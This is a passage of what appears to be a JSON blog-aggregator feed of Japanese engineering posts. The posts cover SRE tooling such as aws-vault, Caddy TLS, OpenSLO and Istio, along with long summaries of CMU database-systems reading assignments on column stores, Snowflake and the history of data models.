株式会社スリーシェイク.","link":"https://sreake.com/blog/aws-ssm-automation/","isoDate":"2023-02-16T02:40:28.000Z","dateMiliSeconds":1676515228000,"authorName":"Sreake","authorId":"Sreake"},{"title":"行指向と列指向の違いについての論文を読む","contentSnippet":"この記事の趣旨前回と同様にCMU Advanced Databas Systems Spring2023のReading Assignmentとして出ている論文を読み論文紹介のやり方 / How to reviewで紹介されている方法をまとめていきます。今回はBigQueryやSnowflake、Amazon Redshiftといった分析向けデータベースが採用している行指向ストア(Column-store)と列指向ストア(Row-store)の差と行指向ストアがのどうのような最適化がパフォーマンスに影響を与えているかについて扱った論文を読んで行きます。Column-Stores vs. Row-Stores: How Different Are They Really?研究全体の背景行指向データベースシステムは分析用ワークロードで列指向データベースシステムより優れたパフォーマンスを発揮することで知られている。なぜなら行指向ストアはクエリ実行に必要なデータのみをディスクまたはメモリから取得するため、優れたI/Oパフォーマンスを達成できるからである。問題意識垂直パーティショニングや全ての行をパーティショニングすることで、列指向データベースで行指向データベースのようなパフォーマンスを実現できるだろうか？ また行指向データベースが高速に動作するのはどのような最適化手法の影響が大きいのか？論文の目的列指向データベースで垂直パーティショニングやクエリ実行で使われる全ての行にインデックスを張るなどして、擬似的に行指向データベースを再現することで分析用途でのパフォーマンスが向上するのか？ また行指向データベースの高速化に用いられるテクニックを一つずつ無効化し、パフォーマンスを比較することでどのような要素が行指向データベースのパフォーマンスを向上させているかを検証しする。手法の説明Star Schema Benchmarkを用いてC-Storeと商用列指向データベースの比較を行う。リアライゼーション、ブロックプロセッシングをそれぞれ無効化しどの要素の影響が最も大きいか。またこの論文で提案されたinvisible joinの評価を行なう。結果列指向ストアに置けるマテリアライズトビューリアライズドビュー(MV)に比べ非常に優れたパフォーマンスを発揮する。一方でCSの一つの行にMVとして期待するアウトプットのタプルをStringとして保存すると、普通のRSよりも低いパフォーマンスとなる。 RS MV > RS > CS MVとなる。列指向ストアに行指向ストアを再現する一般的な列指向のアプローチを適用し、効果的であればbitmap1またはbloom filter2を適用する(T)一般的な列指向のアプローチを適用するが、bitmapを積極的に使用する(T(B))一つのテーブルを複数のテーブルとして垂直分割を行う(VP)全ての行にインデックスを貼り、値の読み込みは全てインデックス経由で行う(AI)結果としては平均してMV > T > T(B) > VP > AIとなる。列指向ストアに置ける最適化手法とその影響列指向ストアの最適化手法においてどの影響が大きいかを測定するためそれぞれを無効化することで検証を行なう。測定対象の最適化項目としては以下の4つを対象とする。ブロックプロセッシングの有効化(B)または無効化(b)Invisible joinの有効化(I)または無効化(i)保存時のデータ圧縮の有効化(C)または無効化(c)遅延マテリアライゼーションの有効化(L)または無効化(l)結果は平均するとBICL > bICL > BiCL > biCL > BicL > bicL > biclとなる。まとめと考察既に知られていたように行指向ストアは列指向ストアに対して常に優れたパフォーマンスを発揮した。リアライゼーションとデータの圧縮はパフォーマンスの改善に大きく影響した。ブロックプロセッシングやInvisible Joinも上記の二つに比べると影響は小さいものの最適化として有効に働いた。Oracle Document 索引↩Bloom Filters↩","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/3_columner_store_vs_rower_store","isoDate":"2023-02-12T15:22:37.000Z","dateMiliSeconds":1676215357000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Caddy の Internal TLS 証明書の有効期間を指定する","contentSnippet":"以前 ワンライナーで https の Reverse Proxy を実行する という記事で Caddy を使うと local での開発用に任意のドメインの証明書を簡単に発行できるし CA の証明書も OS の証明書ストアに保存してくれるた","link":"https://blog.1q77.com/2023/02/caddy-internal-tls-cert-lifetime/","isoDate":"2023-02-09T14:29:32.000Z","dateMiliSeconds":1675952972000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":" ポストモーテムはじめました","contentSnippet":"ポストモーテムはじめました - 良いポストモーテムを執筆するために必要な5つのポイント というタイトルで登壇してきました。\\r\\r2023年02月09日\\rインシデントにどう対応してきたか？みんなで学ぶポストモーテム Lunch LT\\rhttps://findy.connpass.com/event/273197/\\r\\r『ポストモーテムはじめました』というタイトルで登壇しました。 - じゃあ、おうちで学べる  \\rhttps://syu-m-5151.hatenablog.com/entry/2023/02/09/113316","link":"https://speakerdeck.com/nwiizo/posutomotemuhazimemasita","isoDate":"2023-02-09T05:00:00.000Z","dateMiliSeconds":1675918800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Snowflakeの論文を読む","contentSnippet":"この記事の趣旨前回と同様にCMU Advanced Databas Systems Spring2023のReading Assignmentとして出ている論文を読み、感想と抄訳のようなものにまとめます。まとめていたのですが、そもそも全体をまとめてしまっていいのか？ 文量もふえてしまうので論文紹介のやり方 / How to reviewで紹介されている方法を参考にやっていきます。ただし実装論文が対象なので手法の説明は厚めにとりあげ、結果については省略します。今回は近年DWHとして存在感を増しているSnowflakeがどのようなアーキテクチャを取っているか、そしてどのように分散システムの上にデータベースシステムを構築しているかについての内容になります。https://15721.courses.cs.cmu.edu/spring2023/papers/02-modern/vuppalapati-nsdi22.pdfBuilding An Elastic Query Engine on Disaggregated Storage研究全体の背景Cloud技術をベースとしたデータウェアハウス(DWH)であるSnowflakeの運用経験に基づいた論文。Snowflakeは計算リソースとストレージの柔軟性、マルチテナント、高いパフォーマンスを目的にデザインされている。この論文ではSnowflakeが設計と実装においてどのようにCloud技術を応用し目的を達成しているかについて書かれている。問題意識既存のクエリ実行エンジンやDWHではShared-nothing方式を採用することでデータをノードに分散させ、処理をスケールさせたり高いパフォーマンスを実現していた。一方でワークロードによって要求のことなる各種コンピュータリソースを適切に分配することが難しい、Shared-nothingによる静的にパーティションされたデータでは要求によってノードを増減させることが難しいという問題があった。論文の目的SnowflakeがどのようなアーキテクチャによってShared-nothingが抱える問題を解決し、またクエリプランニングと最適化、同時実行制御を行っているのかの実装をまとめ、紹介している。手法の説明設計の概要Snowflakeでは永続(persistent)データと中間(intermediate)データで扱かいを変えている。Figure1: Snowflake (Virtual) Warehouse Architecture一時ストレージの設計SSDで構成されている。一時データは可能な限りメモリに保存されメモリで保持しきれないデータはスワップ領域のようにSSDに保存される。さらにSSDの空き容量が枯渇した場合、一時的に永続ストレージに保存される。一時ストレージは永続化が不要なデータの保管以外にも永続化データのキャッシュとしても機能する。このキャッシュは日和見的(opportunistically)キャッシュと呼ばれており、その理由は中間データを常に優先するからである。クエリスケジューリングユーザーからのクエリはサービスエンドポイントでパース、実行計画の生成、最適化、実行に必要タスクの生成が行なわれ、ここで生成されたread/writeを含むタスクは計算リソースに割り振られ、計算リソースから必要に応じて一時、永続ストレージからのデータ取得が行なわれる。このときタスクの割り振りは一時ストレージが対象の永続データをキャッシュしているかも考慮される。またSnowflakeは Work stealingという他ノードに割り振られたタスクをあるノードの方が速く処理できる場合、臨機応変にタスクを実行するしくみがある。リソースの柔軟性ストレージと計算リソースを分離することでSnowflakeはそれぞれを独立してスケールアウトさせている。ストレージの柔軟性はデータストアであるS3に委任している一方で、計算リソースの柔軟性は事前に暖気運転されたノードプールによって実現している。Snowflakeでは永続データのキャッシュ時に保存されるノードが決っている一方で、対象となるデータをキャッシュするノードがない場合、一時的にほかのノードにタスクを割り振り計算リソースがスケールし対象となるデータがキャッシュされた時に再度タスクを割り当てるという機能が存在する。まとめと考察SnowflakeはS3を永続ストレージとして使用、VM全体を計算リソースとそのメモリ、スワップ領域とみなすことでスケーラビリティと高いパフォーマンスを実現した。とくに日和見的キャッシュとタスクスケジューリングメカニズムはShared-nothing方式の抱えていた、リバランスの問題を解決した。Snowflakeが現在達成できていないマルチテナントや計算リソースの高いユーティリゼーションの実現方法としてあげている手法をとっているため、今後の機能追加が競争力維持のために重要となる。","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/2_snowflake_sigmod_22","isoDate":"2023-02-07T15:34:03.000Z","dateMiliSeconds":1675784043000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"OpenSLO とは？","contentSnippet":"はじめに OpenSLO の概要に触れながら SLO as Code の現状についてお話しします。 OpenSLOとは？ OpenSLO とは、サービスレベル目標 (SLO)、それに関連するリソースの記述形式を標準化する […]The post OpenSLO とは？ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/openslo/","isoDate":"2023-02-07T03:37:40.000Z","dateMiliSeconds":1675741060000,"authorName":"Sreake","authorId":"Sreake"},{"title":"CMU Advanced Database Systems Spring2023のReading Assignmentを読む part1","contentSnippet":"CMU Advanced Database Systems Spring2023とはカーネギメロン大学(CMU)ではAdvanced Database Systemsという講義が開講されており、特に2023年1月始まりの講義です。講義の内容はモダンなDBMSの内部実装を学んで行くコースとなっており、データベースの歴史を皮切りにOLAP DB、ストレージモデルやCompressionなどなど様々な実装を学べるそうです。https://15721.courses.cs.cmu.edu/spring2023/この講義はReading Assignmentがあり、その対象となる論文や書籍内容は一般に公開されています。(一部非公開)この記事ではその第一回、History of Databasesの\\"What Goes Around Comes Around\\"を読んだ感想文となります。CMU生にはさらにWhat \\"What Goes Around Comes Around... And Around\\"という2023年公開の最新版があるそうです。おそらくドキュメント指向やKVS、グラフ指向やNewSQLなど様々な加筆があるのでしょう。読んでみたいですね。論文を読んでIMS、CODASYL時代からリレーショナルへの変遷をたどったことで後世においてより良いとして選ばれたものとそれへの反対、新しい機能の提案とそれが市場に受け入れられるプロセス、そして複雑さとシンプルさのサイクルを学んだ。おそらくこれらの変遷、市場との関わり方はデータベースのみならずあらゆることに適応できるんじゃないかと思う。現在の比較的新しい技術であるNewSQLはもともと市場のelepahntであるGoogleにより生み出され、また既存のRDBが抱えていたwriteスケールアウトへの課題からおそらく今後受容されるのではないかと思う。またXMLで生まれたセミ構造化が比較的シンプルな現在のJSONやドキュメントDBに受け継がれたこと、またビジネス側の素早い開発に対応したいというニーズの合致により現在の成功があるのでしょう。一方でOracleのConverged Databaseの考え方は正しいと思える反面、RDBの起原であるシンプルさからは遠ざかっているように感じる。XMLやCODASYLほど難しくなければ大丈夫なのだろうが、このまま機能を膨らませ続けると……と不安にもなる。What Goes Around Comes AroundAbstractこの論文はタイトルからわかるとおりデータベースの歴史についてまとめたもので、1960年代から2006年までの35年を9つの時代に分けて振り返っている。35年の歴史の中でデータモデルは共通したアイデアが多く、たった数種類しか登場していない。データベースの歴史を学ぶ重要性としてほとんどの研究者は歴史を学んでおらず、すでに否定されたアプローチを再発してしまうことがあるためである。実際今(2006年当時)のXML時代は1970年代のCODASYLの「複雑さ」という失敗を繰り返している。Introductionデータモデルの提案は1960年代から始まった。この論文では以下の9つの時代についてまとめている。階層型(IMS): 1960年代後半から1970年代にかけてネットワーク(CODASYL): 1970年代リレーショナル: 1970年代から1980年代前半にかけてエンティティ-リレーションシップ: 1970年代拡張リレーショナル: 1980年代セマンティック: 1970年代後半から1980年代オブジェクト指向: 1980年代後半から1990年代前半オブジェクトリレーショナル: 1980年代後半から1990年代前半セミ構造化: 1990年代後半から現在(2006年当時)階層型(IMS): 1960年代後半から1970年代にかけてIMSは1968年にリリースされた階層型データモデルでレコードタイプの概念を持っていた。レコードタイプとはデータ型に紐付いた名前のついたフィールドの集まりである。それぞれのインスタンスのレコードタイプはレコードタイプによって指定されたデータの説明に従っており、またいくつかの名前付きフィールドはどのレコードを指定しているのか明示していなければならない(Keyのようなもの)。そしてレコードタイプは木構造を成している1これらを満たす木構造データには2つの課題があり、は情報の重複と(ルート以外)親が必ず存在しなければ行けないことである。コメント: 現代プログラミングでも情報の重複は同様の理由で忌諱されてますね。IMSが階層型データを選んだのはデータ処理をシンプルにするためである。IMSの操作言語DL/1は1レコードずつしか処理できず(record-at-a-time)、プログラマがクエリのアルゴリズムを記述しIMSが実行する方式を取っていた。IMSは4つのストレージフォーマットがありいくつかはDL/1の実行に制限を与えた。それはオペレーションのパフォーマンス劣化を防ぐためであったものの、DL/1のプログラムが正しく動くことを保証できないためデータの保存方法を最適化することができなかった。データベースアプリケーションがどんなチューニングが行われたかに関わらず物理レベルで動き続けることをデータの物理的独立性(physical data independence)と呼ぶ。DBMSアプリケーションは通常一度に書かれるわけではないため重要である。新規プログラムが追加されるたびにチューニングの需要は変わり、より良いDBMSのパフォーマンスはストレージの構成を変更することで達成される。データの論理的独立性(logical data independence)をサポートしていた。コメント: ビジネスロジックが増えてもDBMSを使うアプリの機能を追加できないと困る上で記載したIMSの課題を解決するためにIMSは異なる2つのデータベースからデータタイプを共通の値で\\"fused(joined)\\"する方法を提供した。このIMSの特徴から以下のレッスンを学ぶことができる。データの物理的・論理的独立性は非常に望ましい木構造データモデルはとても制限的洗練された木構造データの論理的データ再構成は難しいrecord-at-a-timeユーザーインターフェースはプログラマにマニュアルのクエリ最適化を強制し、それはしばしば難しい。ネットワーク(CODASYL): 1970年代CODASYL(Committie on Data Systems Languages)委員会は1969年にネットワークデータモデルのレポートをリリースした。委員会は1971年、1973年とread-at-a-time型データ処理言語の仕様をリリースしており、アドホック型の委員会であった。ネットワークデータモデルはそれぞれKeyを持ったレコードタイプの集まりから構成されており、木構造というよりはネットワーク構造になっている。インスタンスは複数のownerを持つことができ、IMSが\\"fused\\"として提供していたデータ構造をより自然に表現できた。childレコードタイプを持つことができ、要するに1-to-nの関係が成り立つ。CODASYLのネットワークは複数の名前の付きレコードタイプと名前付きsetからなるグラフであり、そこには必ず一つ以上のentry pointが存在する。entry pointとはいずれのsetのchildでもないレコードセットである。このCODASYLのデータ構造はIMSのいくつかの問題を解決したものの、setが双方向関係(two-way relationship)しか示すことができず三方向関係(three-way relationship)を表現する場合3つのsetが必要になり不自然な表現になってしまう。コメント: 3つのFKを持つテーブルを作るときにjunction tableが3必要になるからってこと？またCODASYLのデータアクセス言語はrecord-at-a-time方式を取っており、子レコードタイプのentry pointとなる親以外の親に到達したい場合、entry pointのsetに属する子を探しその中から子につながる特定のsetを持つ親を探すという方法を取る。プログラマが最後にアプリケーションがアクセスしたレコード、最後にアクセスしたレコードのレコードタイプ、そして最後にアクセスしたレコードのsetタイプを管理する必要がありCharlie Bachman(産業界のデータベース研究者)が「四次元を航海するようだ」と表現下ほど難解であった。加えてIMSがそれぞれのデータベースが独立して外部データソースからのバルクロードが可能だったに対し、CODASYLはすべてのデータが一つの大きなネットワークであったため大きなデータを一度にロードする必要があり時間がかかった。そしてCODASYLのデータベースが破損した場合すべてのデータをダンプから復元する必要があり、データの復旧に多くの時間がかかった。このCODASYLの特性から以下のレッスンを学ぶことができる。ネットワークは階層型に比べ柔軟であるが複雑でもある。ネットワークの読み込みと復旧は階層型に比べ複雑である。リレーショナル: 1970年代から1980年代前半にかけて階層型とネットワーク型データベースを背景に1970年、Ted Coddはリレーショナルモデルを提案した。このデータモデルはデータの独立性にフォーカスされている。この提案は以下の3つである。データをシンプルに構造で保存する(テーブル)データにはハイレベルなset-at-a-time DMLでアクセスする物理ストレージへの提案は不要シンプルなデータ構造にすることで論理的データの独立性を、ハイレベルなDMLでを提供することで物理的データの独立性を提供し、物理ストレージの提案を不要とした。またリレーショナルモデルの柔軟さはほとんどすべてのデータを表現可能というアドバンテージを実現した。研究者を始めとしたリレーショナルデータベース推進派と産業界のDBMSユーザーによるCODASYL推進派で、どちらのほうが優れているかという議論が行われた。マイコンの大量生産と一般化により、OracleやINGRESなど多くの商用リレーショナルシスタムが台頭した。一方で既存のネットワークモデルシステムは移植性が低くマイコンではあまり広がらなかった。しかし産業界が強いメインフレームではIMSやIDMSなどリレーショナルではないシステムが引き続き使われた。また現実的なデータマネジメントはメインフレームで行われた。1984年にIBMがDB/2をメインフレーム向けにリリース。DB/2は容易に使うことができたため市場で大きな成功を収め、リレーショナルデータベースをの今後を決定付けSQLはリレーショナル言語のデファクトとなった。コメント: RDBが成功するのは必然のように思えるがIBMのDB/2がリリースされなければどのように展開していたのだろうその後IBMはIMSのインターフェースとしてDL/1だけではなくSQLを対応する方針を取った。IMSの上にSQLを対応させるのは非常に難航した。これらの経緯から以下のレッスンを学ぶことができる。Set-at-a-time言語は物理的データの独立性を向上させるため、データモデルに関わらず優れている論理的データ独立性はシンプルなデータモデルほど達成しやすい技術的な議論は技術的な理由よりも市場の雄によって左右されることが多いクエリオプティマイザはDBMSアプリケーションのプログラマによって書かれたrecord-at-a-timeのクエリより優れていたエンティティ-リレーションシップ: 1970年代Peter Chenは1970年代中盤にリレーショナルやCODASYL、階層型の大体としてエンティティ-リレーションシップ(E-R)データモデルを提案した。この提案ではデータベースをエンティティのインスタンスの集合として捉え、いずれのエンティティもアトリビュートというエンティティの特徴を定めるデータエレメントを持つと定義した。アトリビュートをユニークなデータ(Key)としてデザインし、エンティティ間でリレーションシップを持つと定義した。データモデルとしてE-Rデータモデルが受け入れられることはなかった一方でデータベース(特にスキーマ)のデザインツールとして大きく成功した。当時すでに第一から第四を含む複数の正規化が提案されていたものの、機能的依存関係(Functional Dependencies)などを前提としていた。そのためデータベースアドミニストレータにとってはすぐに適用することが難しかった一方で、E-Rデータモデルを使用した手法とツールは第三正規化を行ったテーブル群を提供できたため大きく成功した。このE-Rデータモデルの経緯から機能的依存関係の理解は多くの人々にとって難しいという学びを得ることができる。拡張リレーショナル: 1980年代1980年代初頭頃からリレーションデータベースやクエリ言語の考えを拡張する形で様々論文が発表された。その中で発表された考えの中で特に影響の大きかったものはGemというクエリ言語であり特徴は以下である。Set-valued attributesアトリビュートに対して、そのようなデータ型を提供するAggregation (tuple-reference as a data type)Foreign Keyで参照されたほかエンティティのタプルに対して、\\"cascated dot\\"記法による以下のようなアクセス方法を提供する。Select Supply.SR.snoFrom SupplyWhere Supply.PT.pcolor = \\"red\\"Generalizationアトリビュートが共通する複数のエンティティがある時、共通部分を切り出したエンティティとそれを継承(inherit)するエンティティを作成できる。Gemは様々な便利な機能を提供した一方でリレーショナルモデルのクエリ言語に比べて速度が不足した。トランザクション処理のパフォーマンスとスケーラビリティに焦点を起き、大規模なビジネスシーンで使われた一方拡張リレーショナルなアイデアが与えた影響は一部にとどまった。そこから以下の学びを得ることができる。大きなパフォーマンスの改善または機能的優位性がない限り、新しい機能は受け入れられないセマンティック: 1970年代後半から1980年代時をおなじくしてリレーショナルとは他の学派がリレーショナルデータモデルは意味的に貧弱であると主張し、ポストリレーショナルデータモデルとしてセマンティックデータモデル(SDM)を提案した。SDMはクラスと呼ばれる同じスキーマに従うレコードの集まりに焦点を当てている。SDMはGemのようにAggrigationやGeneralizationを実装し、またSDMのGemeralizationでは複数のクラス同士で対応関係を持つアトリビュートや複数のエンティティからの継承(multiple inheritance)を提供した。そしてSDMのクラスはクラス変数を持っていた。ほとんどのSDMは非常に複雑であり、机上の提案で有ることが多かった。一部SDMデータベースを実装したものがあったが、そのときにはすでにSQLがデファクトと鳴っており、SQLとの互換性がないシステムは市場において成功を収めることは難しかった。SDMは拡張リレーショナルと同様の問題を2つ抱えていた。一つはほとんどの機能がリレーショナルデータベースで再現可能であること。もう一つは著名なベンダーはトランザクション処理の効率化に心血を注いでおり、あまり大きな影響を残すことがなかった。オブジェクト指向: 1980年代後半から1990年代前半1980年代半ばからオブジェクト指向DBMS(OODB)に関心が集まった。この流れはリレーショナルデータベースとC++をはじめとしたオブジェクト指向言語との間のインピーダンスミスマッチに起因するものであった。1970年末期、RDBでは独自の命名システム、データ型、クエリの結果を持ち、またプログラミング言語もそれらに対する独自のシステムを持っていた。データベースとプログラミング言語がそれぞれにやり取りするための仕組みを提供する必要があった。DBMSとプログラミング言語をより密結合させる機能を実装する流れができ、特に永続的プログラミング言語(persistent programming language)というプログラミング言語の変数でディスクベースのデータをメモリに乗ったデータのように扱う方法などを提供する言語を実装しようとした。プログラミング言語の取り組みはプログラミング言語の専門家には受け入れられず一般化することはなかった。このような経緯とC++の興盛があり1980年半ばに永続的プログラミング言語が再度注目され、またオブジェクト指向データベース(OODB)の研究が盛んになった。OODBではC++をデータモデルとしてサポートし、その結果C++のオブジェクトを永続化した。永続化C++はエンジニア市場に訴求するために1. 問い合わせはC++オブジェクトを通して参照する、2. トランザクション管理を行わない、3. 従来のC++と競争できるランタイムを提供する、といった要件を定めた。コメント: ORMマッパーのようなプログラム側でよしなにするのではなくDBMSで対処しようとするのが実にデータベース脳しかし以下のような理由からすべてのOODBベンダーは失敗した。OODBベンダーはデータのロード、アンロード機能を提供したが多くの顧客はそれに大金を払うほどの価値を見出さなかったスタンダードが存在せず、全てのOODBは互換性がなかった永続化されたオブジェクトのなにかが変更された場合、それを使用するすべてのプログラムは再読込を必要としたC++以外で書かれたアプリケーションが一つでもあるとOODBのデータを共有できなかった加えてOODBはトランザクション管理がなくビジネスデータを扱うには貧弱で、プログラムがデータベース上のすべてのデータにアクセスできる。そしてCODASYL時代と同様record-at-a-timeのクエリしか提供しないといった理由から市場に浸透することはなかった。これらのOODB時代から以下の教訓を得られる。システムは大きな課題を解決できなければ売れない永続的プログラミング言語はプログラミング言語のコミュニティからのサポートがなければ成功しないオブジェクトリレーショナル: 1980年代後半から1990年代前半オブジェクトリレーショナル(OR)時代はINGRESで地理情報システム(GIS)を扱いたいというモチベーションから始まった。INGRESSのB-treeでは一次元アクセスしか実装されておらず、簡単なGIS検索をSQLで表現することが難しく普通のB-treeで処理しようとすると非常に性能が悪かった。初期のRDBでは整数型、フロート型、文字列型と基本的なオペレータ、B-treeによるデータアクセスのみがサポートされていたが、GISをはじめとしたそれ以外のデータ型とアクセス方法を必要とする市場があった。そのような状況に対応するためORはユーザー定義のデータ型、オペレータ、関数、そしてアクセスメソッドの機能をSQLエンジンに追加した。その機能を搭載したプロトタイプとして1986年にPostgresが発表した。GISのような多次元インデックスに対応するためQuad treeやR-treeが提案され、高性能GIS DBMSを構築することができた。時をおなじくして、Sybaseがストアドプロシージャを開発した。これによりアプリケーションとDBMSの間で処理を少ないやり取りに減らすことができ、アプリケーションのパフォーマンスを効率化することができた。オブジェクト指向RDBMSとなった。当時PostgresはIlustraにより商用化され数年間は市場を探すことに苦労したものの、その後のインターネットの流行の波に乗りサイバースペースのデータベース(the data base for cyberspace)として成功を収めた。Postgresによって発展したOR技術はOracleなどにも適用され、またXMLのサポートにも使われている(た)。一方でOR技術はスタンダードが存在しないためビジネスでの仕様がはばかられた。我々はこのPostgresとオブジェクトリレーショナルから以下の学びを得られた。オブジェクトリレーショナルのメリットは以下の2つであるデータベースにコードをのせられる(またコードとデータの境界を曖昧にする)ユーザー定義アクセスメソッドの提供新しい技術を広げるにはスタンダードか大手によるゴリ押しが必須セミ構造化: 1990年代後半から現在(2006年当時)直近5年(2006年当時のため2000年ごろ)、セミ構造化データの研究の波が来ている。特にXMLを中心としたXMLSchemaやXQueryと行った技術である。それぞれの研究の共通点として特に下記の2つがある。Schema Last(データが先)複雑なネットワーク指向データモデル(XMLデータモデル)Schema Lastセミ構造化以前のデータモデルではデータをDBMSのに蓄積するためにはスキーマが必要であった。一方でセミ構造化データではスキーマ定義を後回し、または定義せずデータインスタンス自体が構造を説明する方式を取った。アトリビュートがメタデータを持つ必要がある。一方でそのようなデータは同一データタイプのインスタンス同士を比較することが難しい。なぜなら同じオブジェクトの情報が同じ表現をしていることとは限らないからである。このような状態をセマンティック異質性(semantic heterogeneity)と呼ぶ。データは以下の4種類に分類することができる。完全な構造化データいくらかのフィールド名を含む完全な構造化データセミ構造化データテキストデータSchema Lastアプローチを取れるのは3つ目のセミ構造化のみである。なぜなら1,2はORDBMSとして扱われるデータであり、4のテキストデータは完全にスキーマが存在しないからである。またそのようなデータは控えめな量であり、Schema lastデータベースはニッチなマーケットと言えるだろう。コメント: 2023年現在、確かに筆頭ではないもののニッチと言うには大きめな需要だと考える複雑なネットワーク指向データモデル(XMLデータモデル)XMLデータモデルはDocument Type Definitions(DTDs)またはXMLSchemaにより記載されるデータで、DBMS研究者のコミュニティでは欠陥があると考えられている。なぜならこれらの標準は今まで提案されたすべてのデータモデルの仕様を含み、十分複雑な仕様含むからである。例えばXMLSchemaは以下のような特徴がある。IMSのように階層化できるCODASYLやGem、SDMのように参照できるSDMのようにセット・アトリビュートを持てるSDMのように他のレコードを継承できるこれらに加えXMLSchemaはDBMSコミュニティがその複雑さのために既存のデータモデルには用いなかった、union type(一つのアトリビュートが複数のデータ型を取れる機能)などを実装している。XMLSchema以上に複雑なデータモデルも過去には存在していた。これほど複雑なデータモデルについて考察することは難しいが、以下の様なシナリオが考えられる。XMLSchemaはその複雑さから失敗するよりシンプルなXMLSchemaのデータ指向なサブセットが提案されるXMLSchemaはIMSやCODASYLと同様の問題を抱えながらも成功するコメント: 2023年現在JSONは2番目のシナリオのもと十分に成功したと言えるセミ構造化データのサマリXMLデータモデルはその複数の機能からまとめることは難しいが、XMLは通信をまたいで連携するためのデータモデルとして成功しあらゆるシステムはXMLデータの送受信に備えることになるだろう。コメント: 2023年現在ではJSONで置き換えられつつあるとはいえ、セミ構造化データが連携用データモデルとして成功したと言える理由は簡単で他のデータフォーマットがファイアウォールを超えることができない一方で、XMLはシステム間の成約をこう得てプレーンテキストとしてやり取りすることができるためである。XML DBMSは(2006年)現在主流なDBMSと競争することのできるパフォーマンスのエンジンとなると思われるが、Schema Lastは限られた市場でのものになるだろう。次にXqueryは複数ベンダーのOR SQLシステムをマッピングできるサブセットとなるだろう。XqueryをUDFとして定義することは難しくないため、既存のエンジンの上にXQuery関数をUDFとして定義することでSQLインターフェースの上に実装されるだろう。コメント: 実際2023年現在に主流なDBMSであるOracle、MySQL、PostgreSQLはいずれもXqueryとXML機能を提供しているまたXMLは時折セマンティック異質性(semantic heterogeneity)を解決すると考えられているがそのようなことはないだろう。これらのセミ構造化データとXMLはから以下のレッスンが得られる。Schema Lastはおそらくニッチな市場になるだろうXQueryはほぼOR SQLの別のシンタックスとなるだろうXMLはエンタープライズにおけるセマンティック異質性は解決しないまとめ(Full Circle)このペーパーでは30年間のデータモデルの変遷を追って来たが、30年間で一周したと言えるだろう。XMLによる再びの複雑さである。1980年代前半にCODASYLとリレーショナルの対立を経験したものはXMLのの成功を疑っている。歴史と同じ過ちを繰り返さないためにはすでにその道をたどった人々の肩の上に乗ることが重要である。it is always wise to stand on the shoulders of those who went before, rather than on their feet.直近の20年(1980年から2000年にかけて)本質的に新しかったデータモデルのアイデアはデータベース上のコード(オブジェクトリレーショナルから)Schema last(セミ構造化から)のみであった。注釈https://www.imagazine.co.jp/ims-data-solution/)より↩","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/1_history_of_database","isoDate":"2023-01-29T17:44:04.000Z","dateMiliSeconds":1675014244000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"GitLabで指定したグループ内の全てのリポジトリを一括でcloneする","contentSnippet":"概要1個1個丹精込めて手動でcloneすることに限界を感じたので、一括で自分に関連するリポジトリをcloneする シェルスクリプト.zshrc# リポジトリのディレクトリを作成してからcloneする# 第1引数 URL(https://gitlab.example.com/diaspora/diaspora-client.git)function git_clone_to_path() {  [[ -z ${commands[git]} ]] \\\\    && { echo \'git is required\'; return 1; }  loca...","link":"https://zenn.dev/tayusa/articles/ae5911391c9440","isoDate":"2023-01-29T17:07:31.000Z","dateMiliSeconds":1675012051000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"ArtifactHUBについてのメモ","contentSnippet":"ArtifactHUB というコンテナイメージHelm Chartなどを登録・検索することのできるツールを試してみたのでメモ。https://artifacthub.io/ ArtifactHUB についてコンテナイメージHelm Chartなどを「リポジトリ」として登録・検索することができるよう。登録できるリポジトリの種類は下記で確認できる。https://artifacthub.io/docs/topics/repositories/アカウント登録方法は現在下記の3つがあるemailgithubgoogle リポジトリの登録リポジトリ登...","link":"https://zenn.dev/bells17/articles/artifacthub-note","isoDate":"2023-01-21T18:21:58.000Z","dateMiliSeconds":1674325318000,"authorName":"bells17","authorId":"bells17"},{"title":"container-structure-testによるコンテナのテスト","contentSnippet":"Googleが作成しているcontainer-structure-testというコンテナをテストするツールを試したのでメモ。かなり単純なツールなのでぶっちゃけREADMEに書いてあることを読めばわかるんだけど一応情報をまとめた。https://github.com/GoogleContainerTools/container-structure-testGoogleのブログで紹介されている記事はこちら。https://opensource.googleblog.com/2018/01/container-structure-tests-unit-tests.html cont...","link":"https://zenn.dev/bells17/articles/container-structure-test","isoDate":"2023-01-21T10:54:17.000Z","dateMiliSeconds":1674298457000,"authorName":"bells17","authorId":"bells17"},{"title":"aws-vault のすすめ","contentSnippet":"aws-vault とは AWS の認証情報をローカルに安全に保管する事が出来る CLI ツール GitHub Star 7K⭐ (2022-12-22現在) brew で下記のコマンドのようにインストール可能 リポジト […]The post aws-vault のすすめ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/aws-vault/","isoDate":"2023-01-19T05:45:36.000Z","dateMiliSeconds":1674107136000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【Istio⛵️】サービスメッシュの登場経緯とIstioサイドカーインジェクションの仕組み","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️代表的なサービスメッシュの種類についてIstioのサイドカーインジェクションの仕組みについてこの記事から得られる知識01. はじめに02. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかサイドカープロキシメッシュ03. admission-controllersアドオンについてadmission-controllersアドオンとはadmissionプラグインの種類MutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはAdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReview▼ AdmissionRequest▼ AdmissionResponse04. サイドカーインジェクションの仕組み全体のフロークライアント ➡︎ kube-apiserverここで説明するフロー箇所(1) Podの作成をリクエストkube-apiserver ➡︎ Serviceここで説明するフロー箇所(2) 認証/認可処理をコール(3) アドオンの処理をコール(4) AdmissionRequestに値を詰める(5) AdmissionReviewを送信Service ➡︎ webhookサーバーここで説明するフロー箇所(6) 15017番ポートにポートフォワーディングkube-apiserver ⬅︎ Service ⬅︎ webhookサーバー 